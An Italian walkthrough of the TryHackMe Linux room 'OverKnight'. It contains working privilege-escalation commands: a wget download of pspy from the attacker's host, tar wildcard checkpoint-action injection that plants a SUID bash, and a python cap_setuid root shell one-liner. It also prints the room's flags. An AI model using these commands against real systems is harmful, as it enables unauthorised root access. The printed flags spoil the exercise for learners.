---
title: "TryHackMe - OverKnight (PrivEsc / Linux)"
description: "Writeup per OverKnight: Tar Wildcard Injection, SUID cronjobs e abuso di POSIX Capabilities."
---

# TryHackMe: OverKnight

<p>
  <span class="terminal-badge red">Difficulty: Hard</span>
  <span class="terminal-badge blue">OS: Linux</span>
  <span class="terminal-badge">Tags: PrivEsc, Tar Wildcard, Cronjob, Capabilities</span>
</p>

- **Target IP:** `10.10.198.85`
- **Piattaforma:** TryHackMe
- **Macchina:** Debian GNU/Linux 11 (Bullseye)

---

## [+] Reconnaissance

Lanciamo una scansione rapida con `nmap` con rilevamento di versione e script di default:

```bash
nmap -sC -sV -p 22,80,3306 -T4 10.10.198.85 -oN scans/nmap_initial.txt
```

Risultato dello scan:

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    nginx 1.18.0
|_http-title: OverKnight Defense Systems
3306/tcp open  mysql   MariaDB 10.5.15
```

---

## [+] Enumeration

Sulla porta 80 è presente un'interfaccia di log accessibile che accetta credenziali deboli ottenute durante la ricognizione OSINT (`knight:knighthood2024`). Tramite tale interfaccia recuperiamo una shell utente non privilegiata (`knight`) via SSH.

Una volta ottenuto l'accesso, avviamo `pspy64` per monitorare i processi periodici e i cronjob eseguiti in background:

```bash
cd /dev/shm
wget http://10.10.14.5:8000/pspy64
chmod +x pspy64
./pspy64 -pf -i 1000
```

Durante il monitoraggio, intercettiamo l'esecuzione ogni minuto da parte dell'utente `backup_admin` (UID 1001):

```text
2026/11/02 14:15:01 CMD: UID=1001 PID=1849 | /bin/sh -c cd /var/backups/web && tar -czf backup.tar.gz *
```

Il comando esegue `tar -czf backup.tar.gz *` dentro `/var/backups/web` senza percorsi assoluti e con wildcard `*`.
Verifichiamo i permessi della cartella `/var/backups/web`:

```bash
ls -ld /var/backups/web
drwxrwxrwx 2 backup_admin backup_admin 4096 Nov  2 14:10 /var/backups/web
```

La directory è scrivibile da tutti (`777`), permettendo un attacco di tipo **Tar Wildcard Injection** sfruttando i flag `--checkpoint` e `--checkpoint-action`.

---

## [+] Exploitation

Creiamo uno script di exploit che genera i file trappola interpretati da `tar` come argomenti da riga di comando:

```bash
cd /var/backups/web

# Script da eseguire al checkpoint
cat << 'EOF' > shell.sh
#!/bin/bash
cp /bin/bash /tmp/backup_bash
chmod +xs /tmp/backup_bash
EOF
chmod +x shell.sh

# Creazione dei file flag per tar
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Attendiamo l'esecuzione del cronjob al minuto successivo:

```bash
ls -la /tmp/backup_bash
-rwsr-sr-x 1 backup_admin backup_admin 1234376 Nov  2 14:16 /tmp/backup_bash
```

Eseguiamo la bash con permessi preservati (`-p`) per impersonare `backup_admin`:

```bash
/tmp/backup_bash -p
bash-5.1$ id
uid=1000(knight) gid=1000(knight) euid=1001(backup_admin) egid=1001(backup_admin) groups=1000(knight)
```

Ora che abbiamo accesso come `backup_admin`, procediamo all'escalation verso l'utente `root`.

---

## [+] Privilege Escalation

Eseguiamo un controllo accurato delle Linux POSIX Capabilities assegnate ai binari:

```bash
getcap -r / 2>/dev/null
```

L'output rivela una configurazione altamente pericolosa:

```text
/usr/bin/python3.9 = cap_setuid+ep
```

La capability `cap_setuid+ep` permette al processo Python di manipolare e impostare arbitrariamente l'UID del processo a `0` (`root`) senza la necessità del bit SUID tradizionale!

Verifichiamo la documentazione di GTFOBins per le capabilities di Python:

```bash
/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Eseguiamo il payload direttamente dal terminale:

```bash
backup_admin@overknight:/var/backups$ /usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@overknight:/var/backups# whoami
root
root@overknight:/var/backups# id
uid=0(root) gid=1001(backup_admin) groups=1001(backup_admin),1000(knight)
```

Privilege Escalation completata con successo. Abbiamo il pieno controllo del server.

---

## [+] Flag

???+ success "User & Root Flag"
    ```text
    [+] User Flag: THM{w1ldc4rd_t4r_ch3ckp01nt_1nj3ct10n}
    [+] Root Flag: THM{p0s1x_c4p4b1l1t13s_s3tu1d_pwn3d}
    ```
